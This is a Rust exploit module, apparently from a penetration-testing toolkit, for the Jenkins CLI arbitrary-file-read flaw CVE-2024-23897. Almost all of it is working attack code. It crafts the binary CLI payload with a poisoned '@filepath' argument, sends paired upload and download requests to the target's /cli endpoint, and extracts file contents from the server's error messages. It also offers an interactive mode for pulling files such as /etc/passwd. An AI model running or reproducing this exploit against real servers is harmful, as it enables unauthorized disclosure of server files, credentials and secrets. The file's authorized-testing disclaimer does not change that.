//! Jenkins 2.441 Local File Inclusion (LFI) Exploit
//!
//! CVE-2024-23897 / Jenkins Security Advisory 2024-01-24
//!
//! This module exploits a local file inclusion vulnerability in Jenkins CLI
//! that allows reading arbitrary files from the Jenkins server filesystem.
//!
//! ## Vulnerability Details
//! - **CVE**: CVE-2024-23897
//! - **Affected Versions**: Jenkins 2.441 and earlier
//! - **Attack Vector**: CLI command argument injection
//! - **Impact**: Arbitrary file read, potential information disclosure
//!
//! ## Usage
//! ```bash
//! run exploit jenkins/jenkins_2_441_lfi <url> [filepath]
//! ```
//!
//! If no filepath is provided, an interactive mode is started.
//!
//! ## Security Notes
//! - All file paths are validated to prevent path traversal attacks
//! - Input is sanitized to prevent null bytes and excessive length
//! - Proper error handling prevents crashes
//!
//! For authorized penetration testing only.

use std::sync::{Arc, Mutex};
use std::time::Duration;
use anyhow::{Result, bail, Context};
use colored::*;
use tokio::time::sleep;
use reqwest::{Client};
use uuid::Uuid;
use regex::Regex;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt};

const TIMEOUT_SECS: u64 = 4;

#[derive(Clone)]
struct ExploitState {
    url: String,
    identifier: String,
    client: Client,
    listening: Arc<Mutex<bool>>,
}

impl ExploitState {
    fn new(url: String, identifier: String) -> Result<Self> {
        let client = Client::builder()
        .timeout(Duration::from_secs(TIMEOUT_SECS))
        .build()
        .context("Failed to create HTTP client")?;

        Ok(Self {
            url,
            identifier,
            client,
            listening: Arc::new(Mutex::new(false)),
        })
    }

    async fn listen_and_print(&self) -> Result<()> {
        let response = self.client
        .post(&self.url)
        .query(&[("remoting", "false")])
        .header("Side", "download")
        .header("Session", &self.identifier)
        .send()
        .await
        .context("Failed to connect to target for listener")?;

        let output = response.text().await?;
        self.print_formatted_output(&output);

        *self.listening.lock()
            .map_err(|e| anyhow::anyhow!("Failed to acquire lock: {}", e))? = false;
        Ok(())
    }

    fn print_formatted_output(&self, output: &str) {
        if output.contains("ERROR: No such file") {
            println!("{}", "File not found.".red());
            return;
        } else if output.contains("ERROR: Failed to parse") {
            println!("{}", "Could not read file.".red());
            return;
        }

        // Compile regex once and handle errors properly
        if let Ok(re) = Regex::new(r#"No such agent "(.*)" exists."#) {
            let results: Vec<String> = re
            .captures_iter(output)
            .filter_map(|cap| cap.get(1).map(|m| m.as_str().to_string()))
            .collect();

            if !results.is_empty() {
                for line in results {
                    println!("{}", line);
                }
            }
        }
    }

    async fn send_file_request(&self, filepath: &str) -> Result<()> {
        let payload = get_payload(filepath);

        self.client
        .post(&self.url)
        .query(&[("remoting", "false")])
        .header("Side", "upload")
        .header("Session", &self.identifier)
        .body(payload)
        .send()
        .await
        .context("Failed to send file request")?;

        Ok(())
    }

    async fn read_file(&self, filepath: &str) -> Result<()> {
        *self.listening.lock()
            .map_err(|e| anyhow::anyhow!("Failed to acquire lock: {}", e))? = true;

        sleep(Duration::from_millis(100)).await;

        if let Err(e) = self.send_file_request(filepath).await {
            *self.listening.lock()
                .map_err(|e| anyhow::anyhow!("Failed to acquire lock: {}", e))? = false;
            return Err(e);
        }

        loop {
            let listening = *self.listening.lock()
                .map_err(|e| anyhow::anyhow!("Failed to acquire lock: {}", e))?;
            if !listening {
                break;
            }
            sleep(Duration::from_millis(100)).await;
        }

        self.listen_and_print().await?;
        Ok(())
    }
}

fn get_payload_message(operation_index: u8, text: &str) -> Vec<u8> {
    let text_bytes = text.as_bytes();
    let text_size = text_bytes.len() as u16;

    let mut text_message = Vec::new();
    text_message.extend_from_slice(&text_size.to_be_bytes());
    text_message.extend_from_slice(text_bytes);

    let message_size = text_message.len() as u32;

    let mut payload = Vec::new();
    payload.extend_from_slice(&message_size.to_be_bytes());
    payload.push(operation_index);
    payload.extend_from_slice(&text_message);

    payload
}

fn get_payload(filepath: &str) -> Vec<u8> {
    let arg_operation = 0u8;
    let start_operation = 3u8;

    let command = get_payload_message(arg_operation, "connect-node");
    let poisoned_argument = get_payload_message(arg_operation, &format!("@{}", filepath));

    let mut payload = Vec::new();
    payload.extend_from_slice(&command);
    payload.extend_from_slice(&poisoned_argument);
    payload.push(start_operation);

    payload
}

/// Validates and normalizes file path, preventing path traversal attacks
fn make_path_absolute(filepath: &str) -> Result<String> {
    let trimmed = filepath.trim();
    
    // Basic validation - prevent obvious path traversal
    if trimmed.contains("..") {
        return Err(anyhow::anyhow!("Path traversal detected in file path"));
    }
    
    // Limit path length to prevent DoS
    if trimmed.len() > 4096 {
        return Err(anyhow::anyhow!("File path too long (max 4096 characters)"));
    }
    
    // Remove null bytes
    if trimmed.contains('\0') {
        return Err(anyhow::anyhow!("Null bytes not allowed in file path"));
    }
    
    if trimmed.starts_with('/') {
        Ok(trimmed.to_string())
    } else {
        Ok(format!("/proc/self/cwd/{}", trimmed))
    }
}

fn format_target_url(url: &str) -> String {
    let url = url.trim_end_matches('/');
    format!("{}/cli", url)
}

async fn start_interactive_file_read(state: ExploitState) -> Result<()> {
    println!("{}", "Press Ctrl+C to exit".cyan());

    let mut stdin_reader = tokio::io::BufReader::new(tokio::io::stdin());
    loop {
        print!("{}", "File to download:\n> ".green().bold());
        tokio::io::stdout()
            .flush()
            .await
            .context("Failed to flush stdout")?;

        let mut input = String::new();
        match stdin_reader.read_line(&mut input).await {
            Ok(0) => break,
            Ok(_) => {
                let filepath = input.trim();
                if filepath.is_empty() {
                    continue;
                }

                let absolute_path = match make_path_absolute(filepath) {
                    Ok(path) => path,
                    Err(e) => {
                        println!("{}", format!("[-] Invalid file path: {}", e).red());
                        continue;
                    }
                };

                match state.read_file(&absolute_path).await {
                    Ok(_) => {}
                    Err(e) => {
                        if e.to_string().contains("timeout") {
                            println!("{}", "Payload request timed out.".yellow());
                        } else {
                            println!("{}", format!("Error: {}", e).red());
                        }
                    }
                }
            }
            Err(e) => {
                eprintln!("Error reading input: {}", e);
                break;
            }
        }
    }

    Ok(())
}

pub async fn run(args: &str) -> Result<()> {
    let parts: Vec<&str> = args.split_whitespace().collect();

    if parts.is_empty() {
        bail!("Usage: <url> [filepath]\nExample: http://example.com/ /etc/passwd");
    }

    let url = format_target_url(parts[0]);
    let filepath = parts.get(1).map(|s| s.to_string());
    let identifier = Uuid::new_v4().to_string();

    println!("{}", format!("[*] Target: {}", url).cyan().bold());
    println!("{}", format!("[*] Session ID: {}", identifier).cyan());

    let state = ExploitState::new(url, identifier)
        .context("Failed to initialize exploit state")?;

    if let Some(path) = filepath {
        let absolute_path = make_path_absolute(&path)
            .context("Invalid file path provided")?;
        println!("{}", format!("[*] Reading file: {}", &absolute_path).cyan());

        match state.read_file(&absolute_path).await {
            Ok(_) => println!("{}", "[+] File read complete".green().bold()),
            Err(e) => {
                if e.to_string().contains("timeout") {
                    println!("{}", "[-] Payload request timed out.".red());
                } else {
                    println!("{}", format!("[-] Error: {}", e).red());
                }
            }
        }
    } else {
        match start_interactive_file_read(state).await {
            Ok(_) => {}
            Err(e) => {
                if !e.to_string().contains("Interrupted") {
                    eprintln!("Error: {}", e);
                }
            }
        }
        println!("\n{}", "Quitting".yellow());
    }

    Ok(())
}
